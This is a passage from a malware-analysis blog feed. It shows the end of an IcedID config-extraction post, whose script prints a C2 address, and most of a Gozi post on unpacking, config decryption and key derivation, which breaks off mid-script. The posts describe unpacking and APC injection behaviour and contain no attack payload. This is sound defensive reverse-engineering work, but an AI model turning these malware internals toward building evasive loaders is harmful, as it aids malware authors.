&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/23.png"
width="1106"
height="404"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/23_hu432940433aa376f036172f82063f2f5f_69117_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/23_hu432940433aa376f036172f82063f2f5f_69117_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Cookie string creation"
class="gallery-image"
data-flex-grow="273"
data-flex-basis="657px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/24.png"
width="467"
height="61"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/24_hue59f29b484e086b960b375cc4050b73c_1654_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/24_hue59f29b484e086b960b375cc4050b73c_1654_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="My special cookie"
class="gallery-image"
data-flex-grow="765"
data-flex-basis="1837px"
>&lt;/p>
&lt;p>Anyways, the goal of this challenge was to unpack and grab the c2 address, and we have enough information to do that.
We just need to combine our unpacking script with the string decryption, and we should be good.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">binaryninja&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">BinaryReader&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">re&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">br&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">data_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">config&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x20&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">config&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">extract_url_from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">byte_string&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_ascii&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">byte&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">byte_string&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">byte&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">126&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_ascii&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_ascii&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">extracted_ascii&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pattern&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">re&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">compile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.*com&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pattern&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">extracted_ascii&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">url&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">config&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7ffc97718000&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">extract_url_from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[*] C2 Address -&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/25.png"
width="686"
height="71"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/25_hue54092cb6e7962d1293af356ed0736fa_6094_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/25_hue54092cb6e7962d1293af356ed0736fa_6094_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Finished "
class="gallery-image"
data-flex-grow="966"
data-flex-basis="2318px"
>&lt;/p>
&lt;p>I could have automated the entirety of this, but its an old sample so I don&amp;rsquo;t wanna put a ton of effort into something that may only be valid for this sample, so instead I&amp;rsquo;ll move onto a fresh upload, maybe agent tesla :D&lt;/p>
&lt;p>You can find all the scripts I used &lt;a class="link" href="https://github.com/Kvn11/scripts/tree/main" target="_blank" rel="noopener"
>HERE&lt;/a>&lt;/p></description></item><item><title>Gozi malware unpacking and config extraction</title><link>https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/</link><pubDate>Mon, 27 Nov 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/</guid><description>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/cover.jpg" alt="Featured image of post Gozi malware unpacking and config extraction" />&lt;h2 id="sample-info">Sample Info
&lt;/h2>&lt;p>&lt;a class="link" href="https://bazaar.abuse.ch/sample/0a66e8376fc6d9283e500c6e774dc0a109656fd457a0ce7dbf40419bc8d50936/" target="_blank" rel="noopener"
>0a66e8376fc6d9283e500c6e774dc0a109656fd457a0ce7dbf40419bc8d50936&lt;/a>&lt;/p>
&lt;h2 id="unpacking">Unpacking
&lt;/h2>&lt;p>The &lt;code>dll&lt;/code> is loaded at &lt;code>0x400000&lt;/code> in &lt;code>x32dbg&lt;/code>.
We can set breakpoints at &lt;code>VirtualAlloc&lt;/code> and &lt;code>VirtualProtect&lt;/code> to catch any regions of memory where the desired payload will be unpacked to.
This method will show that &lt;code>VirtualAlloc&lt;/code> is called 3 times.
The first contains some encrypted or encoded data, and isn&amp;rsquo;t very useful to us.
The second call will allocate at &lt;code>x0dF0000&lt;/code> where a mangled &lt;code>PE&lt;/code> gets written to.
The third call is interesting because it comes from the PE file written to the second allocation.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/1.png"
width="701"
height="130"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/1_hub3c112b6c2702c0095feab9ead5374db_10009_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/1_hub3c112b6c2702c0095feab9ead5374db_10009_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Third call comes from within second mem allocation"
class="gallery-image"
data-flex-grow="539"
data-flex-basis="1294px"
>&lt;/p>
&lt;p>This third allocation is made at &lt;code>0x2BC0000&lt;/code> and also contains a &lt;code>PE&lt;/code> file, but its headers are not mangled like the first.
We can dump this one to take a look.
Alternatively, you can also go through the &lt;code>VirtualProtect&lt;/code> calls.
This &lt;code>PE&lt;/code> will be used to overwrite the running process.
After the last &lt;code>VirtualProtect&lt;/code>, you can dump the original process memory and you&amp;rsquo;ll have the same bin file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/2.png"
width="533"
height="224"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/2_hufdffc2a5a5fe8f87feb28c32f4da8039_7895_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/2_hufdffc2a5a5fe8f87feb28c32f4da8039_7895_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="MZ says its a PE file"
class="gallery-image"
data-flex-grow="237"
data-flex-basis="571px"
> &lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/3.png"
width="1059"
height="224"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/3_hu200c9c1a9d3de7a88548d18dcb944378_8694_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/3_hu200c9c1a9d3de7a88548d18dcb944378_8694_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=".bss with low entropy is misleading"
class="gallery-image"
data-flex-grow="472"
data-flex-basis="1134px"
>&lt;/p>
&lt;p>At this point, I wasn&amp;rsquo;t sure if this was the last stage or not, so I continue in &lt;code>x32dbg&lt;/code> in case I ran into more &lt;code>VirtualAlloc&lt;/code> or &lt;code>HeapAlloc&lt;/code> but pretty soon realized this was the main module.
The sample will use local APC injection to run some threads to decrypt the config we want and a few other tasks.
For the sake of brevity I will skip pass that process, but if you wanted to repeat it, you could set a break point at the call to &lt;code>CreateThread&lt;/code> (&lt;code>0x402020&lt;/code>), and once you get there, change the &lt;code>EIP&lt;/code> to point to the thread payload, which should be &lt;code>0x401b7f&lt;/code>.
After locating the code that was decrypting the config data in &lt;code>.bss&lt;/code>, I was able to continue the reversing process in Binary Ninja.&lt;/p>
&lt;h2 id="reversing-decryption-routine">Reversing Decryption Routine
&lt;/h2>&lt;p>The decryption process is pretty straightforward from here.
First, a base of 0 is established.
Then the key is subtracted from this base.
Then this new value (&lt;code>base - key&lt;/code>) is added with the &lt;code>dword&lt;/code> of data being decrypted.
Then the decrypted data is written to a buffer.
This loop will happen a max of &lt;code>0x400&lt;/code> times, or until the data grabbed is 0.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/6.png"
width="1050"
height="677"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/6_hu21f0da7eed4ee62b4985d87338685bd7_52904_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/6_hu21f0da7eed4ee62b4985d87338685bd7_52904_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Simple decryption loop"
class="gallery-image"
data-flex-grow="155"
data-flex-basis="372px"
>&lt;/p>
&lt;p>The pseudo code could be understood as:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x400&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dword&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encrypted_data&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">dword&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">x&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">prev&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">decrypted_dword&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">dword&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">decrypted_dword&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="key-generation">Key generation
&lt;/h2>&lt;p>Figuring out the key is a bit more tricky.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/4.png"
width="941"
height="503"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/4_hu46a1f1dcbf9cb71c408f8955410fbc82_46584_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/4_hu46a1f1dcbf9cb71c408f8955410fbc82_46584_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Somewhat complex (not really) key generation"
class="gallery-image"
data-flex-grow="187"
data-flex-basis="448px"
>&lt;/p>
&lt;p>Stepping through &lt;code>x32dbg&lt;/code> I was able to figure out the formula to be:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">key = &amp;#39;Apr &amp;#39; + &amp;#39;26 2&amp;#39; + &amp;lt;.bss rva&amp;gt; + some int - 1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Some int is a value picked up from calling &lt;code>NtQuerySystemInformation&lt;/code> and grabbing a &lt;code>dword&lt;/code> from it.
The value itself doesn&amp;rsquo;t matter, because that value is divided by &lt;code>0x13&lt;/code> and only the remainder is used, and then two values, the &lt;code>NTSTATUS&lt;/code> return value and 1, are added to it.
&lt;code>STATUS_SUCCESS&lt;/code> is defined as &lt;code>0x0&lt;/code>, so as long as &lt;code>NtQuerySystemInformation&lt;/code> succeeds, we are only really adding 1 to our remainder.
Hence the possible values of this mystery integer are 1 - 0x14.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/7.png"
width="615"
height="700"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/7_huf6506cc8afd5f4613c8f335fcf7e494c_59389_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/7_huf6506cc8afd5f4613c8f335fcf7e494c_59389_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Figuring out what the mystery integer is supposed to be&amp;hellip;"
class="gallery-image"
data-flex-grow="87"
data-flex-basis="210px"
>&lt;/p>
&lt;h2 id="final-script">Final Script
&lt;/h2>&lt;p>Through a little brute force, you can figure out that the secret value is supposed to be 18.
Here&amp;rsquo;s the final script I used, its meant to be ran with &lt;code>Binja&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">binaryninja&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">BinaryReader&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decrypt_strings&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">secret_sauce&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bss&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_section_by_name&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.bss&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">start&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">br&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">bss&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bss&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">start&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># TODO: Get key dynamically&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;Apr &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;26 2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">key1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">key2&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">rva&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">secret_sauce&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x4&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x400&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">curr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">key&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">curr&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">result&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">curr&lt;/span>
